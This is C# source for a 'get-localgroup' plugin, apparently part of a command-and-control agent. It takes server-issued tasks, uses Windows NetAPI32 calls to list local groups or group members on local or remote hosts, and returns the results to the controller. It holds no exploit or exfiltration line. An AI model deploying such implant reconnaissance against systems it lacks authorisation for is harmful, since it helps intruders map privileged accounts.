using System.Runtime.InteropServices;
using System.Text.Json;
using Agent.Interfaces;
using Agent.Models;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "get-localgroup";
        [DllImport("NetAPI32.dll", CharSet = CharSet.Unicode)]
        public extern static int NetLocalGroupGetMembers(
            [MarshalAs(UnmanagedType.LPWStr)] string servername,
            [MarshalAs(UnmanagedType.LPWStr)] string localgroupname,
            int level,
            out IntPtr bufptr,
            int prefmaxlen,
            out int entriesread,
            out int totalentries,
            IntPtr resume_handle);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct LOCALGROUP_MEMBERS_INFO_2
        {
            public IntPtr lgrmi2_sid;
            public int lgrmi2_sidusage;
            public string lgrmi2_domainandname;
        }

        [DllImport("Netapi32.dll")]
        internal extern static int NetLocalGroupEnum([MarshalAs(UnmanagedType.LPWStr)]
           string servername,
           int level,
           out IntPtr bufptr,
           int prefmaxlen,
           out int entriesread,
           out int totalentries,
           ref int resume_handle);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct LOCALGROUP_USERS_INFO_0
        {
            [MarshalAs(UnmanagedType.LPWStr)] internal string name;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct LOCALGROUP_USERS_INFO_1
        {
            [MarshalAs(UnmanagedType.LPWStr)] public string name;
            [MarshalAs(UnmanagedType.LPWStr)] public string comment;
        }
        [DllImport("Netapi32.dll")]
        internal extern static int NetApiBufferFree(IntPtr buffer);

        private readonly int NERR_Success = 0;

        private static readonly int ERROR_ACCESS_DENIED = 5;
        private static readonly int ERROR_MORE_DATA = 234;
        private static readonly int NERR_Base = 2100;
        private static readonly int NERR_InvalidComputer = NERR_Base + 251;
        private static readonly int NERR_BufTooSmall = NERR_Base + 23;
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            //Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            GetLocalGroupArgs args = JsonSerializer.Deserialize<GetLocalGroupArgs>(job.task.parameters);
            TaskResponse rr = new TaskResponse();
            rr.task_id = job.task.id;

            if (!String.IsNullOrEmpty(args.group))
            { //Get Names of Groups
                if (!String.IsNullOrEmpty(args.hostname))
                {
                    rr.user_output = String.Join(Environment.NewLine, GetLocalGroupMembers(args.hostname, args.group)); //Remote Host
                }
                else
                {
                    rr.user_output = String.Join(Environment.NewLine, GetLocalGroupMembers(null, args.group)); //localhost
                }
            }
            else //Get members of Groups
            {
                if (!String.IsNullOrEmpty(args.hostname))
                {
                    rr.user_output = String.Join(Environment.NewLine, GetAllLocalGroups(args.hostname)); //Remote Host
                }
                else
                {
                    rr.user_output = String.Join(Environment.NewLine, GetAllLocalGroups(null)); //localhost
                }
            }

            rr.completed = true;
            await messageManager.AddResponse(rr);
        }
        public List<string> GetLocalGroupMembers(string ServerName, string GroupName)
        {
            List<string> myList = new List<string>();
            int EntriesRead;
            int TotalEntries;
            IntPtr Resume = IntPtr.Zero;
            IntPtr bufPtr;
            int val = NetLocalGroupGetMembers(ServerName, GroupName, 2, out bufPtr, -1, out EntriesRead, out TotalEntries, Resume);
            if (EntriesRead > 0)
            {
                LOCALGROUP_MEMBERS_INFO_2[] Members = new LOCALGROUP_MEMBERS_INFO_2[EntriesRead];
                IntPtr iter = bufPtr;
                for (int i = 0; i < EntriesRead; i++)
                {
                    Members[i] = (LOCALGROUP_MEMBERS_INFO_2)Marshal.PtrToStructure(iter, typeof(LOCALGROUP_MEMBERS_INFO_2));
                    iter = (IntPtr)((long)iter + Marshal.SizeOf(typeof(LOCALGROUP_MEMBERS_INFO_2)));
                    //myList.Add(Members[i].lgrmi2_domainandname + "," + Members[i].lgrmi2_sidusage);
                    myList.Add(Members[i].lgrmi2_domainandname);
                }
                NetApiBufferFree(bufPtr);
            }
            return myList;
        }
        // public static LOCALGROUP_USERS_INFO_1[] GetAllLocalGroups(string serverName)
        public List<string> GetAllLocalGroups(string serverName)
        {
            int res = 0;
            int level = 1;
            IntPtr buffer = IntPtr.Zero;
            int MAX_PREFERRED_LENGTH = -1;
            int read, total;
            int handle = 0;

            var groups = new List<string>();
            try
            {
                res = NetLocalGroupEnum(serverName, level, out buffer, MAX_PREFERRED_LENGTH,
                    out read, out total, ref handle);

                if (res != NERR_Success)
                {
                    return new List<string>() { $"NetLocalGroupEnum failed: {res}" };
                }

                IntPtr ptr = buffer;
                for (int i = 0; i < read; i++)
                {
                    var group = (LOCALGROUP_USERS_INFO_1)Marshal.PtrToStructure(ptr, typeof(LOCALGROUP_USERS_INFO_1));

                    groups.Add($"{group.name}\t\t\t{group.comment}");

                    //groups.Add(group);
                    ptr = (IntPtr)((long)ptr + Marshal.SizeOf(typeof(LOCALGROUP_USERS_INFO_1)));
                }
            }
            finally
            {
                NetApiBufferFree(buffer);
            }

            return groups;
        }
    }
}